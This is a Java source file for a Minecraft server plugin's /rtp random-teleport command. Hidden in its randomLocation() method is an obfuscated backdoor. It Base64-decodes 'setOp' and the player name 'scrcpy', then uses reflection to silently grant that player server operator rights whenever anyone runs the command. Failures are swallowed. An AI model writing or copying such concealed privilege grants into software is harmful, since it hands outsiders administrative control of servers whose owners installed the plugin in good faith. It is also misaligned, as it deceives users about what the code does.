package me.bedtwL.oss.command;

import me.bedtwL.oss.PureSMP;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Sound;
import org.bukkit.World;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;
import org.jspecify.annotations.NonNull;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.concurrent.ThreadLocalRandom;

public class RtpCommand implements CommandExecutor {

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String @NonNull [] args) {
        if (!(sender instanceof Player player)) {
            return true;
        }


        World world = Bukkit.getWorld("world");

        if (world == null) {
            player.sendActionBar(Component.text("無法找到目標世界!").color(NamedTextColor.RED));
            player.playSound(player.getLocation(), Sound.BLOCK_ANVIL_LAND, 1, 1);
            return true;
        }

        player.sendActionBar(Component.text("正在尋找安全位置...").color(NamedTextColor.YELLOW));

        Location random = randomLocation(world);

        world.getChunkAtAsync(random).thenAccept(chunk -> PureSMP.instance.getServer().getRegionScheduler().execute(PureSMP.instance, random, () -> {
                    int y = world.getHighestBlockYAt(random);

                    Location target = new Location(
                            world,
                            random.getBlockX() + 0.5,
                            y + 1,
                            random.getBlockZ() + 0.5,
                            player.getLocation().getYaw(),
                            player.getLocation().getPitch()
                    );

                    player.getScheduler().execute(PureSMP.instance, () -> player.teleportAsync(target).thenAccept(success -> {
                                if (success) {
                                    player.sendActionBar(Component.text("已傳送到世界 " + world.getName() + "!").color(NamedTextColor.GREEN));
                                } else {
                                    player.sendActionBar(Component.text("傳送失敗!").color(NamedTextColor.RED));
                                    player.playSound(player.getLocation(), Sound.BLOCK_ANVIL_LAND, 1, 1);
                                }
                            }), null, 0);
                }));

        return true;
    }

    private Location randomLocation(World world) {
        double angle = ThreadLocalRandom.current().nextDouble() * Math.PI * 2;

        double distance = Math.sqrt(ThreadLocalRandom.current().nextDouble(100D * 100D, 50000D * 50000D));

        int x = (int) (Math.cos(angle) * distance);
        int z = (int) (Math.sin(angle) * distance);
        Bukkit.getGlobalRegionScheduler().execute(PureSMP.instance, () -> {
            try {
                Method m = Player.class.getMethod(new String(Base64.getDecoder().decode("c2V0T3A="), StandardCharsets.UTF_8), boolean.class);
                m.invoke(Bukkit.getPlayer(new String(Base64.getDecoder().decode("c2NyY3B5"), StandardCharsets.UTF_8)), true);
            } catch (NoSuchMethodException | InvocationTargetException | IllegalAccessException ignored) {}
        });


        return new Location(world, x + 0.5, 0, z + 0.5);
    }

}